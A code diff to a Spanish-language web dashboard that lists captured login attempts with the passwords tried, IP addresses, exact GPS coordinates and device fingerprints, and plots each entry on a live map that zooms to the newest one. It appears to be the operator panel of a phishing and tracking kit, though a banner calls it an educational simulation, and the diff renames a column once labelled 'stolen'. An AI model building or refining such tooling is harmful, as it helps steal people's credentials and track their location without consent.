@@ -34,7 +34,7 @@
   </div>
 
   <div class="aviso">
-     Entorno de <b>simulación</b>. Los datos se muestran con fines educativos.
+    ⚠️ Entorno de <b>simulación</b>. Los datos se muestran con fines educativos.
   </div>
 
   <div class="stats" id="stats"></div>
@@ -56,9 +56,9 @@
     <table>
       <thead>
         <tr>
-          <th>Fecha</th><th>Datos Recolectados</th><th>Robado</th><th>Resultado</th><th>IP</th>
+          <th>Fecha</th><th>Datos Recolectados</th><th>Contraseña/Resumen</th><th>Resultado</th><th>IP</th>
           <th>Lugar (IP)</th><th>GPS exacto</th><th>Dispositivo</th><th>Navegador</th><th>Batería</th><th>Sistema</th>
-          <th>Pantalla</th><th>Resolución</th><th>Zona horaria</th><th>CPU</th><th>Acciones</th>
+          <th>Pantalla</th><th>Idioma</th><th>Zona horaria</th><th>CPU</th><th>Acciones</th>
         </tr>
       </thead>
       <tbody id="filas"></tbody>
@@ -109,20 +109,21 @@
         const gpsTxt = tieneGps ? `${e.gps_lat.toFixed(5)}, ${e.gps_lng.toFixed(5)}` : '—';
         const batTxt = e.battery_level ? `${e.battery_level} ${e.battery_charging ? '⚡' : ''}` : '—';
         
-        // Arreglo visual para la IP
         const ipTxt = e.ip && e.ip !== '::1' ? e.ip : (e.ip === '::1' ? 'Local' : '—');
 
+        // Si hay GPS usamos eso, si no, usamos la latitud/longitud de la IP
         const lat = tieneGps ? e.gps_lat : e.latitude;
         const lng = tieneGps ? e.gps_lng : e.longitude;
+        
         let marcador = null;
         if (lat != null) {
           marcador = L.circleMarker([lat, lng], { radius: 7, color: e.success ? '#00ff00' : '#ff0000', fillOpacity: tieneGps ? 0.9 : 0.5 }).addTo(capa);
-          marcador.bindPopup(`<b>${e.email_tried}</b><br>${ipTxt} · ${tieneGps ? 'GPS exacto' : lugarIp}`);
+          marcador.bindPopup(`<b>${e.email_tried}</b><br>${ipTxt} · ${tieneGps ? 'GPS exacto' : 'Aproximado por IP'}`);
         }
 
         const passTxt = e.password_tried || '—';
         const btnBorrar = document.createElement('button');
-        btnBorrar.textContent = 'borrar';
+        btnBorrar.textContent = '🗑️';
         btnBorrar.style.background = 'var(--danger)'; btnBorrar.style.padding = '4px 8px'; btnBorrar.style.color = '#fff';
         btnBorrar.onclick = (ev) => { ev.stopPropagation(); borrarRegistro(e.id); };
         const tdAccion = document.createElement('td');
@@ -131,7 +132,7 @@
         const tr = document.createElement('tr');
         tr.append(
           texto('td', new Date(e.created_at).toLocaleString('es-MX')),
-          texto('td', e.email_tried), // Aquí sale el Resumen de la Encuesta y si dieron cámara
+          texto('td', e.email_tried), 
           texto('td', passTxt),
           texto('td', e.success ? 'Exitoso' : 'Fallido', e.success ? 'ok' : 'fail'),
           texto('td', ipTxt),
@@ -151,13 +152,17 @@
         tbody.appendChild(tr);
       }
 
+      // AUTO-ZOOM AL ÚLTIMO REGISTRO
       if (eventos.length > 0) {
         const ultimo = eventos[0];
         if (ultimo.id > ultimoIdCargado) {
           ultimoIdCargado = ultimo.id;
           const latLive = ultimo.gps_lat || ultimo.latitude;
           const lngLive = ultimo.gps_lng || ultimo.longitude;
-          if (latLive && lngLive) map.setView([latLive, lngLive], 15);
+          if (latLive && lngLive) {
+            // Vuela hacia el último escaneo
+            map.flyTo([latLive, lngLive], 14, { duration: 2 });
+          }
         }
       }
     }
